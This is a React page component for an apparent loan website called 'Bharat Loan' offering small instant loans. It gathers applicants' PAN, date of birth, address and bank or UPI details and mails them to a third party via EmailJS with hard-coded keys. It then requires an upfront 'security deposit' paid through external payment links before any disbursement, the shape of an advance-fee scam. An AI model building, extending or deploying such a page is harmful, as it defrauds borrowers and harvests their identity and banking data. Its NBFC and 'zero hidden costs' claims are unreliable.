import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser';
import { 
  CheckCircle2, Clock, ShieldCheck, Zap, 
  ChevronRight, Lock, AlertCircle, FileText, 
  Banknote, HelpCircle, User, Briefcase, 
  MapPin, Landmark, Smartphone, FileCheck, CreditCard
} from 'lucide-react';
import { cn } from '../lib/utils';

const INDIAN_STATES = [
  "Andaman and Nicobar Islands", "Andhra Pradesh", "Arunachal Pradesh", "Assam", 
  "Bihar", "Chandigarh", "Chhattisgarh", "Dadra and Nagar Haveli and Daman and Diu", 
  "Delhi", "Goa", "Gujarat", "Haryana", "Himachal Pradesh", "Jharkhand", "Karnataka", 
  "Kerala", "Lakshadweep", "Madhya Pradesh", "Maharashtra", "Manipur", "Meghalaya", 
  "Mizoram", "Nagaland", "Odisha", "Puducherry", "Punjab", "Rajasthan", "Sikkim", 
  "Tamil Nadu", "Telangana", "Tripura", "Uttar Pradesh", "Uttarakhand", "West Bengal"
];

const LOAN_TIERS = [
  { amount: 1000, pf: 34, gst: 16 },
  { amount: 2000, pf: 68, gst: 32 },
  { amount: 3000, pf: 102, gst: 48 },
  { amount: 4000, pf: 136, gst: 64 },
  { amount: 5000, pf: 170, gst: 80 },
];

export default function Home() {
  const navigate = useNavigate();
  const formRef = useRef<HTMLDivElement>(null);
  const summaryRef = useRef<HTMLDivElement>(null);

  const [step, setStep] = useState<'select' | 'form' | 'summary'>('select');
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);

  // Form State
  const [formData, setFormData] = useState({
    fullName: '',
    dob: '',
    fatherName: '',
    pan: '',
    occupation: '',
    address: '',
    pin: '',
    state: '',
    disbursementMethod: 'Bank Account',
    accountName: '',
    accountNumber: '',
    confirmAccountNumber: '',
    ifsc: '',
    upiId: '',
    consentAccuracy: false,
    consentTerms: false,
  });

  const [formErrors, setFormErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (step === 'form' && formRef.current) {
      formRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
    } else if (step === 'summary' && summaryRef.current) {
      summaryRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }, [step]);

  const handleAmountSelect = (amount: number) => {
    setSelectedAmount(amount);
    setStep('form');
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value, type } = e.target as HTMLInputElement;
    const checked = (e.target as HTMLInputElement).checked;
    
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
    
    // Clear error on change
    if (formErrors[name]) {
      setFormErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = () => {
    const errors: Record<string, string> = {};
    
    if (!formData.fullName.trim()) errors.fullName = 'Full Name is required';
    if (!formData.fatherName.trim()) errors.fatherName = 'Father\'s Name is required';
    
    if (!formData.dob) {
      errors.dob = 'Date of Birth is required';
    } else {
      const birthDate = new Date(formData.dob);
      const today = new Date();
      let age = today.getFullYear() - birthDate.getFullYear();
      const m = today.getMonth() - birthDate.getMonth();
      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
        age--;
      }
      if (age < 18) {
        errors.dob = 'You must be at least 18 years old to apply';
      }
    }

    if (!formData.pan.trim()) {
      errors.pan = 'PAN is required';
    } else if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(formData.pan.toUpperCase())) {
      errors.pan = 'Invalid PAN format';
    }

    if (!formData.occupation) errors.occupation = 'Please select an occupation';
    if (!formData.address.trim()) errors.address = 'Complete Address is required';
    
    if (!formData.pin.trim()) {
      errors.pin = 'PIN Code is required';
    } else if (!/^\d{6}$/.test(formData.pin)) {
      errors.pin = 'Invalid PIN Code (must be 6 digits)';
    }

    if (!formData.state) errors.state = 'Please select a state';

    if (formData.disbursementMethod === 'Bank Account') {
      if (!formData.accountName.trim()) errors.accountName = 'Account Holder Name is required';
      if (!formData.accountNumber.trim()) {
        errors.accountNumber = 'Account Number is required';
      } else if (!/^\d{9,18}$/.test(formData.accountNumber)) {
        errors.accountNumber = 'Invalid Account Number';
      }
      
      if (formData.accountNumber !== formData.confirmAccountNumber) {
        errors.confirmAccountNumber = 'Account numbers do not match';
      }

      if (!formData.ifsc.trim()) {
        errors.ifsc = 'IFSC Code is required';
      } else if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(formData.ifsc.toUpperCase())) {
        errors.ifsc = 'Invalid IFSC format';
      }
    } else {
      if (!formData.upiId.trim()) {
        errors.upiId = 'UPI ID is required';
      } else if (!/^[\w.-]+@[\w.-]+$/.test(formData.upiId)) {
        errors.upiId = 'Invalid UPI ID format';
      }
    }

    if (!formData.consentAccuracy) errors.consentAccuracy = 'You must confirm the accuracy of information';
    if (!formData.consentTerms) errors.consentTerms = 'You must accept the Privacy Policy and Terms & Conditions';

    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      setIsSubmitting(true);
      try {
        const templateParams = {
          loan_amount: selectedAmount,
          full_name: formData.fullName,
          dob: formData.dob,
          father_name: formData.fatherName,
          pan: formData.pan,
          occupation: formData.occupation,
          address: formData.address,
          pin: formData.pin,
          state: formData.state,
          disbursement_method: formData.disbursementMethod,
          account_name: formData.accountName,
          account_number: formData.accountNumber,
          ifsc: formData.ifsc,
          upi_id: formData.upiId
        };
        
        await emailjs.send(
          'service_ph2e8yh',
          'template_hz90nde',
          templateParams,
          '092rocYA_fCh78xuY'
        );
        
        setStep('summary');
      } catch (error) {
        console.error('FAILED to send email...', error);
        // Fallback to next step even if email fails, or show error. Let's proceed for now.
        setStep('summary');
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  const handleContinue = () => {
    if (selectedAmount === 1000) {
      window.location.href = 'https://onetapay.com/pp/Mjc5OA==';
    } else if (selectedAmount === 2000) {
      window.location.href = 'https://onetapay.com/pp/Mjc5OQ==';
    } else if (selectedAmount === 3000) {
      window.location.href = 'https://onetapay.com/pp/MjgwMA==';
    } else if (selectedAmount === 4000) {
      window.location.href = 'https://onetapay.com/pp/MjgwMQ==';
    } else if (selectedAmount === 5000) {
      window.location.href = 'https://onetapay.com/pp/MjgwMg==';
    } else if (selectedAmount) {
      navigate(`/verification${selectedAmount / 1000}.html`);
    }
  };

  const selectedTier = LOAN_TIERS.find(t => t.amount === selectedAmount);
  const totalCharges = selectedTier ? selectedTier.pf + selectedTier.gst : 0;
  const netAmount = selectedTier ? selectedTier.amount : 0;

  return (
    <div>
      {/* Hero Section */}
      <section className="bg-slate-50 relative overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20 lg:py-28 relative z-10 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
          <div>
            <div className="inline-block bg-slate-100 text-slate-600 text-[11px] font-bold uppercase tracking-[1px] px-3 py-1 rounded-full mb-6 italic">
              NBFC Registered Finance Company
            </div>
            <h1 className="text-4xl md:text-5xl lg:text-6xl font-extrabold text-blue-900 tracking-tight mb-6 leading-tight">
              Instant 2 Minutes <br className="hidden md:block"/> <span className="text-emerald-600">Loan Approval</span>
            </h1>
            <p className="text-lg text-slate-600 mb-8 max-w-xl leading-relaxed">
              Bharat Loan provides convenient, paperless credit options for everyday needs. Transparent terms, zero hidden costs, and secure processing.
            </p>
            <div className="flex flex-col sm:flex-row gap-4">
              <button 
                onClick={() => {
                  setStep('select');
                  document.getElementById('apply')?.scrollIntoView({ behavior: 'smooth' });
                }}
                className="bg-blue-900 hover:bg-blue-800 text-white px-10 py-3 rounded-md font-semibold transition-all duration-200"
              >
                Apply Now
              </button>
              <button 
                onClick={() => document.getElementById('how-it-works')?.scrollIntoView({ behavior: 'smooth' })}
                className="border border-blue-900 text-blue-900 hover:bg-blue-50 px-10 py-3 rounded-md font-semibold transition-all duration-200"
              >
                How It Works
              </button>
            </div>
            <div className="mt-8 flex items-center gap-4 text-xs text-slate-400 font-medium">
              <div className="flex -space-x-2">
                <div className="w-8 h-8 rounded-full bg-slate-200 border-2 border-white"></div>
                <div className="w-8 h-8 rounded-full bg-slate-300 border-2 border-white"></div>
                <div className="w-8 h-8 rounded-full bg-slate-400 border-2 border-white"></div>
              </div>
              <span>Trusted by 10,000+ Indians across 20+ States</span>
            </div>
          </div>
          
          <div className="hidden lg:block">
            {/* Using the hero illustration visual structure from design */}
            <div className="bg-white p-8 rounded-2xl shadow-xl border border-slate-100 relative">
              <h3 className="text-lg font-bold text-slate-800 mb-6">Choose Your Loan Amount</h3>
              <div className="grid grid-cols-3 gap-4 mb-8">
                {[1000, 2000, 3000, 4000, 5000].map((amt, i) => (
                  <div key={amt} className={cn("p-4 text-center rounded-xl border transition-all duration-300", i === 0 ? "border-emerald-500 shadow-[0_10px_15px_-3px_rgba(16,185,129,0.1)] -translate-y-1" : "border-slate-200")}>
                    <div className="text-xs text-slate-500 mb-1">Loan Amount</div>
                    <div className="text-xl font-bold text-blue-900">₹{amt.toLocaleString('en-IN')}</div>
                  </div>
                ))}
                <div className="p-4 text-center bg-slate-50 opacity-60 cursor-not-allowed rounded-xl border border-slate-200">
                  <div className="text-xs text-slate-400 mb-1">Locked</div>
                  <div className="text-lg font-bold text-slate-400">₹5,000+</div>
                </div>
              </div>
              <div className="space-y-4 border-t border-slate-100 pt-6">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-500">Estimated Processing Fee</span>
                  <span className="font-medium text-slate-800">₹34.00*</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-slate-500">GST (18%)</span>
                  <span className="font-medium text-slate-800">₹16.00*</span>
                </div>
                <div className="flex justify-between items-center pt-2 border-t border-dashed border-slate-200">
                  <span className="font-bold text-slate-800">Net Disbursement</span>
                  <span className="text-2xl font-black text-emerald-600">₹1,000.00</span>
                </div>
              </div>
              <p className="text-[10px] text-slate-400 mt-4 leading-tight">*Illustrative sample figures for demo purposes. Actual charges subject to company policy and NBFC regulations at the time of agreement.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Intro Section */}
      <section className="py-12 bg-white border-b border-slate-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <p className="text-lg text-slate-600 max-w-3xl mx-auto">
            Welcome to <strong className="text-slate-900">Bharat Loan</strong>, an NBFC-registered finance company committed to offering simple, secure, and rapid credit access. Our completely digital process ensures you can apply from anywhere and receive funds directly to your preferred account upon approval.
          </p>
        </div>
      </section>

      {/* Choose Loan Amount Section */}
      <section id="apply" className="py-16 md:py-24 bg-slate-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Choose Your Loan Amount</h2>
            <p className="text-slate-600">Select the amount you need to get started with your application.</p>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-3 gap-4 md:gap-6 max-w-4xl mx-auto">
            {LOAN_TIERS.map((tier) => (
              <button
                key={tier.amount}
                onClick={() => handleAmountSelect(tier.amount)}
                className={cn(
                  "relative group flex flex-col items-center justify-center p-6 sm:p-8 bg-white rounded-xl border transition-all duration-300 cursor-pointer",
                  selectedAmount === tier.amount && step !== 'select'
                    ? "border-emerald-500 shadow-[0_10px_15px_-3px_rgba(16,185,129,0.1)] -translate-y-1"
                    : "border-slate-200 hover:border-emerald-500 hover:shadow-[0_10px_15px_-3px_rgba(16,185,129,0.1)] hover:-translate-y-1"
                )}
              >
                <span className="text-xs text-slate-500 mb-1">Loan Amount</span>
                <span className="text-2xl sm:text-3xl font-bold text-blue-900 mb-2">₹{tier.amount.toLocaleString('en-IN')}</span>
                
                {selectedAmount === tier.amount && step !== 'select' && (
                  <div className="absolute -top-3 -right-3 bg-emerald-500 text-white p-1 rounded-full shadow-md">
                    <CheckCircle2 size={20} />
                  </div>
                )}
              </button>
            ))}

            {/* Locked Card */}
            <div className="relative flex flex-col items-center justify-center p-6 sm:p-8 bg-slate-50 rounded-xl border border-slate-200 opacity-60 cursor-not-allowed text-center">
              <span className="text-xs text-slate-400 mb-1 flex items-center gap-1 justify-center">
                <Lock size={12} /> Locked
              </span>
              <span className="text-xl sm:text-2xl font-bold text-slate-400 mb-1">₹5,000+</span>
              <span className="text-xs text-slate-400 text-center max-w-[150px]">
                Higher limits unlock based on eligibility policy
              </span>
            </div>
          </div>
        </div>
      </section>

      {/* Application Form Section */}
      {step === 'form' && selectedAmount && (
        <section ref={formRef} className="py-12 bg-white border-y border-slate-200 shadow-inner">
          <div className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="mb-8 pb-6 border-b border-slate-100 flex items-center justify-between">
              <div>
                <h3 className="text-2xl font-bold text-slate-900">Application Form</h3>
                <p className="text-slate-500 text-sm mt-1">Applying for ₹{selectedAmount.toLocaleString('en-IN')}</p>
              </div>
              <button 
                onClick={() => { setStep('select'); setSelectedAmount(null); }}
                className="text-sm font-medium text-blue-600 hover:text-blue-800"
              >
                Change Amount
              </button>
            </div>

            <form onSubmit={handleFormSubmit} className="space-y-8">
              {/* Personal Details */}
              <div className="space-y-6">
                <h4 className="text-lg font-semibold text-slate-900 flex items-center gap-2">
                  <User size={18} className="text-blue-600" /> Personal Details
                </h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-1">Full Name (As per PAN)</label>
                    <input
                      type="text"
                      name="fullName"
                      value={formData.fullName}
                      onChange={handleInputChange}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.fullName ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      placeholder="e.g. Rahul Kumar"
                    />
                    {formErrors.fullName && <p className="text-red-500 text-xs mt-1">{formErrors.fullName}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-1">Date of Birth</label>
                    <input
                      type="date"
                      name="dob"
                      value={formData.dob}
                      onChange={handleInputChange}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.dob ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                    />
                    {formErrors.dob && <p className="text-red-500 text-xs mt-1">{formErrors.dob}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-1">Mobile Number</label>
                    <input
                      type="text"
                      name="fatherName"
                      value={formData.fatherName}
                      onChange={handleInputChange}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.fatherName ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                    />
                    {formErrors.fatherName && <p className="text-red-500 text-xs mt-1">{formErrors.fatherName}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-1">PAN Card Number</label>
                    <input
                      type="text"
                      name="pan"
                      value={formData.pan}
                      onChange={(e) => { e.target.value = e.target.value.toUpperCase(); handleInputChange(e); }}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow uppercase", formErrors.pan ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      placeholder="ABCDE1234F"
                      maxLength={10}
                    />
                    {formErrors.pan && <p className="text-red-500 text-xs mt-1">{formErrors.pan}</p>}
                  </div>
                </div>
              </div>

              {/* Occupation & Address */}
              <div className="space-y-6 pt-6 border-t border-slate-100">
                <h4 className="text-lg font-semibold text-slate-900 flex items-center gap-2">
                  <Briefcase size={18} className="text-blue-600" /> Occupation & Address
                </h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="md:col-span-2">
                    <label className="block text-sm font-medium text-slate-700 mb-1">Occupation</label>
                    <div className="grid grid-cols-3 gap-4">
                      {['Salaried', 'Self Employed', 'Student'].map((occ) => (
                        <label key={occ} className={cn(
                          "cursor-pointer flex items-center justify-center p-3 rounded-md border text-sm font-medium transition-colors",
                          formData.occupation === occ ? "bg-blue-50 border-blue-600 text-blue-700" : "bg-white border-slate-200 text-slate-700 hover:border-slate-300"
                        )}>
                          <input
                            type="radio"
                            name="occupation"
                            value={occ}
                            checked={formData.occupation === occ}
                            onChange={handleInputChange}
                            className="sr-only"
                          />
                          {occ}
                        </label>
                      ))}
                    </div>
                    {formErrors.occupation && <p className="text-red-500 text-xs mt-1">{formErrors.occupation}</p>}
                  </div>
                  <div className="md:col-span-2">
                    <label className="block text-sm font-medium text-slate-700 mb-1">Complete Address</label>
                    <textarea
                      name="address"
                      value={formData.address}
                      onChange={handleInputChange}
                      rows={3}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow resize-none", formErrors.address ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      placeholder="House No, Street, Landmark, City"
                    ></textarea>
                    {formErrors.address && <p className="text-red-500 text-xs mt-1">{formErrors.address}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-1">PIN Code</label>
                    <input
                      type="text"
                      name="pin"
                      value={formData.pin}
                      onChange={handleInputChange}
                      maxLength={6}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.pin ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                    />
                    {formErrors.pin && <p className="text-red-500 text-xs mt-1">{formErrors.pin}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-1">State</label>
                    <select
                      name="state"
                      value={formData.state}
                      onChange={handleInputChange}
                      className={cn("w-full px-4 py-2.5 rounded-md border text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow bg-white", formErrors.state ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                    >
                      <option value="">Select State</option>
                      {INDIAN_STATES.map(s => <option key={s} value={s}>{s}</option>)}
                    </select>
                    {formErrors.state && <p className="text-red-500 text-xs mt-1">{formErrors.state}</p>}
                  </div>
                </div>
              </div>

              {/* Disbursement Details */}
              <div className="space-y-6 pt-6 border-t border-slate-100">
                <h4 className="text-lg font-semibold text-slate-900 flex items-center gap-2">
                  <Banknote size={18} className="text-blue-600" /> Where do you want to receive the loan amount?
                </h4>
                
                <div className="flex gap-4 mb-6">
                  {['Bank Account', 'UPI'].map((method) => (
                    <label key={method} className={cn(
                      "flex-1 cursor-pointer flex items-center justify-center gap-2 p-4 rounded-md border text-sm font-medium transition-colors",
                      formData.disbursementMethod === method ? "bg-blue-50 border-blue-600 text-blue-700" : "bg-white border-slate-200 text-slate-700 hover:border-slate-300"
                    )}>
                      <input
                        type="radio"
                        name="disbursementMethod"
                        value={method}
                        checked={formData.disbursementMethod === method}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      {method === 'Bank Account' ? <Landmark size={18} /> : <Smartphone size={18} />}
                      {method}
                    </label>
                  ))}
                </div>

                {formData.disbursementMethod === 'Bank Account' ? (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 bg-slate-50 p-6 rounded-lg border border-slate-100">
                    <div className="md:col-span-2">
                      <label className="block text-sm font-medium text-slate-700 mb-1">Account Holder Name</label>
                      <input
                        type="text"
                        name="accountName"
                        value={formData.accountName}
                        onChange={handleInputChange}
                        className={cn("w-full px-4 py-2.5 rounded-md border bg-white text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.accountName ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      />
                      {formErrors.accountName && <p className="text-red-500 text-xs mt-1">{formErrors.accountName}</p>}
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-700 mb-1">Account Number</label>
                      <input
                        type="password"
                        name="accountNumber"
                        value={formData.accountNumber}
                        onChange={handleInputChange}
                        className={cn("w-full px-4 py-2.5 rounded-md border bg-white text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.accountNumber ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      />
                      {formErrors.accountNumber && <p className="text-red-500 text-xs mt-1">{formErrors.accountNumber}</p>}
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-700 mb-1">Confirm Account Number</label>
                      <input
                        type="text"
                        name="confirmAccountNumber"
                        value={formData.confirmAccountNumber}
                        onChange={handleInputChange}
                        className={cn("w-full px-4 py-2.5 rounded-md border bg-white text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.confirmAccountNumber ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      />
                      {formErrors.confirmAccountNumber && <p className="text-red-500 text-xs mt-1">{formErrors.confirmAccountNumber}</p>}
                    </div>
                    <div className="md:col-span-2">
                      <label className="block text-sm font-medium text-slate-700 mb-1">IFSC Code</label>
                      <input
                        type="text"
                        name="ifsc"
                        value={formData.ifsc}
                        onChange={(e) => { e.target.value = e.target.value.toUpperCase(); handleInputChange(e); }}
                        className={cn("w-full px-4 py-2.5 rounded-md border bg-white text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow uppercase", formErrors.ifsc ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                        placeholder="SBIN0001234"
                      />
                      {formErrors.ifsc && <p className="text-red-500 text-xs mt-1">{formErrors.ifsc}</p>}
                    </div>
                  </div>
                ) : (
                  <div className="bg-slate-50 p-6 rounded-lg border border-slate-100">
                    <label className="block text-sm font-medium text-slate-700 mb-1">UPI ID</label>
                    <input
                      type="text"
                      name="upiId"
                      value={formData.upiId}
                      onChange={handleInputChange}
                      className={cn("w-full px-4 py-2.5 rounded-md border bg-white text-sm focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-shadow", formErrors.upiId ? "border-red-500 focus:ring-red-500" : "border-slate-300")}
                      placeholder="yourname@bank"
                    />
                    {formErrors.upiId && <p className="text-red-500 text-xs mt-1">{formErrors.upiId}</p>}
                  </div>
                )}
              </div>

              {/* Consent */}
              <div className="space-y-4 pt-6 border-t border-slate-100">
                <label className="flex items-start gap-3 cursor-pointer group">
                  <div className="relative flex items-center h-5 mt-0.5">
                    <input
                      type="checkbox"
                      name="consentAccuracy"
                      checked={formData.consentAccuracy}
                      onChange={handleInputChange}
                      className="w-4 h-4 rounded border-slate-300 text-blue-600 focus:ring-blue-600"
                    />
                  </div>
                  <div className="text-sm text-slate-600">
                    I confirm that all the information provided above is accurate and true to the best of my knowledge.
                    {formErrors.consentAccuracy && <p className="text-red-500 text-xs mt-1">{formErrors.consentAccuracy}</p>}
                  </div>
                </label>
                <label className="flex items-start gap-3 cursor-pointer group">
                  <div className="relative flex items-center h-5 mt-0.5">
                    <input
                      type="checkbox"
                      name="consentTerms"
                      checked={formData.consentTerms}
                      onChange={handleInputChange}
                      className="w-4 h-4 rounded border-slate-300 text-blue-600 focus:ring-blue-600"
                    />
                  </div>
                  <div className="text-sm text-slate-600">
                    I agree to the <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a> and <a href="#" className="text-blue-600 hover:underline">Terms & Conditions</a> of Bharat Loan.
                    {formErrors.consentTerms && <p className="text-red-500 text-xs mt-1">{formErrors.consentTerms}</p>}
                  </div>
                </label>
              </div>

              <div className="pt-4">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-blue-900 hover:bg-blue-800 disabled:bg-blue-700 disabled:opacity-70 text-white px-6 py-4 rounded-md text-base font-bold transition-colors flex justify-center items-center gap-2 shadow-md"
                >
                  {isSubmitting ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Processing...
                    </>
                  ) : (
                    <>
                      Apply and Get Loan <ChevronRight size={20} />
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </section>
      )}

      {/* Summary Section */}
      {step === 'summary' && selectedAmount && selectedTier && (
        <section ref={summaryRef} className="py-16 bg-slate-50 min-h-[70vh]">
          <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
              <div className="bg-slate-900 px-6 py-4 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                  <FileCheck size={20} className="text-emerald-400" />
                  Loan Summary & Charges
                </h3>
              </div>
              
              <div className="p-6 sm:p-8">
                <div className="bg-amber-50 border border-amber-200 rounded-md p-4 mb-8 flex items-start gap-3">
                  <AlertCircle size={20} className="text-amber-600 shrink-0 mt-0.5" />
                  <p className="text-sm text-amber-800">
                    To secure the loan and mitigate associated risks, a security deposit is required. This deposit includes the loan processing fee and applicable GST. Once processed, the full loan amount will be credited directly to your bank account.
                  </p>
                </div>

                <div className="space-y-4 mb-8">
                  <div className="flex justify-between items-center py-3 border-b border-slate-100">
                    <span className="text-slate-600 font-medium">Loan Amount</span>
                    <span className="text-lg font-bold text-slate-900">₹{selectedTier.amount.toLocaleString('en-IN')}</span>
                  </div>
                  <div className="flex justify-between items-center py-3 border-b border-slate-100">
                    <span className="text-slate-600 font-medium">Loan Tenure</span>
                    <span className="text-slate-900 font-medium">12 Months</span>
                  </div>
                  <div className="flex justify-between items-center py-3 border-b border-slate-100">
                    <span className="text-slate-600 font-medium">Monthly EMI</span>
                    <span className="text-slate-900 font-medium">₹{Math.round((selectedTier.amount * 0.02 * Math.pow(1.02, 12)) / (Math.pow(1.02, 12) - 1)).toLocaleString('en-IN')}</span>
                  </div>
                  <div className="flex justify-between items-center py-3 border-b border-slate-100">
                    <span className="text-slate-600">Processing Fee</span>
                    <span className="text-slate-900 font-medium">- ₹{selectedTier.pf}</span>
                  </div>
                  <div className="flex justify-between items-center py-3 border-b border-slate-100">
                    <span className="text-slate-600">GST</span>
                    <span className="text-slate-900 font-medium">- ₹{selectedTier.gst}</span>
                  </div>
                  <div className="flex justify-between items-center py-3 border-b border-slate-100 bg-slate-50 -mx-6 px-6">
                    <span className="text-slate-700 font-semibold">Total Charges</span>
                    <span className="text-slate-900 font-bold">₹{totalCharges}</span>
                  </div>
                  <div className="flex justify-between items-center py-4 border-t border-dashed border-slate-200 mt-2">
                    <span className="text-slate-900 font-bold text-lg">Net Amount to be Disbursed</span>
                    <span className="text-2xl font-black text-emerald-600">₹{netAmount.toLocaleString('en-IN')}</span>
                  </div>
                </div>

                <div className="bg-slate-50 rounded-lg p-5 mb-8 border border-slate-100">
                  <h4 className="text-sm font-semibold text-slate-900 mb-2">Disbursement Details</h4>
                  <div className="flex items-center gap-3 text-sm text-slate-600">
                    {formData.disbursementMethod === 'Bank Account' ? (
                      <>
                        <Landmark size={18} className="text-blue-600" />
                        <span>Bank Account ending in ••••{formData.accountNumber.slice(-4)}</span>
                      </>
                    ) : (
                      <>
                        <Smartphone size={18} className="text-blue-600" />
                        <span>UPI ID: {formData.upiId.replace(/(?<=.).(?=[^@]*?@)/g, '•')}</span>
                      </>
                    )}
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row gap-4">
                  <div className="flex-1 bg-slate-100 text-slate-800 border border-slate-200 px-6 py-3.5 rounded-md text-sm font-semibold text-center flex items-center justify-center gap-2">
                    Sequrity Deposit: ₹{totalCharges}
                  </div>
                  <button
                    onClick={handleContinue}
                    className="flex-1 bg-blue-900 hover:bg-blue-800 text-white px-6 py-3.5 rounded-md text-sm font-semibold transition-colors shadow-md text-center flex justify-center items-center gap-2"
                  >
                    Pay Sequrity Deposit <CreditCard size={18} />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {/* How It Works */}
      <section id="how-it-works" className="py-16 md:py-24 bg-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">How It Works</h2>
            <p className="text-slate-600">Get your loan disbursed in a few simple steps.</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-5 gap-8">
            {[
              { title: 'Choose Amount', icon: Banknote, desc: 'Select the desired loan amount.' },
              { title: 'Enter Details', icon: FileText, desc: 'Provide basic personal info.' },
              { title: 'Review Summary', icon: FileCheck, desc: 'Check charges & terms.' },
              { title: 'Verification', icon: ShieldCheck, desc: 'Complete identity checks.' },
              { title: 'Disbursement', icon: Zap, desc: 'Get funds in your account.' },
            ].map((step, idx) => (
              <div key={idx} className="relative flex flex-col items-center text-center">
                {idx !== 4 && (
                  <div className="hidden md:block absolute top-8 left-[60%] w-[80%] border-t-2 border-dashed border-slate-200"></div>
                )}
                <div className="relative z-10 w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-4 border border-blue-100 text-blue-600">
                  <step.icon size={28} />
                </div>
                <h3 className="text-base font-bold text-slate-900 mb-2">{step.title}</h3>
                <p className="text-sm text-slate-500">{step.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Why Choose Us & Eligibility */}
      <section className="py-16 md:py-24 bg-slate-50 border-t border-slate-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-16">
            <div>
              <h2 className="text-3xl font-bold text-slate-900 mb-8">Why Choose Bharat Loan</h2>
              <div className="space-y-6">
                {[
                  { title: 'Simple Application', desc: '100% digital process with minimal data entry.', icon: FileText },
                  { title: 'Quick Process', desc: 'Fast processing and immediate updates on status.', icon: Clock },
                  { title: 'Secure Information', desc: 'Bank-grade security protecting your personal data.', icon: ShieldCheck },
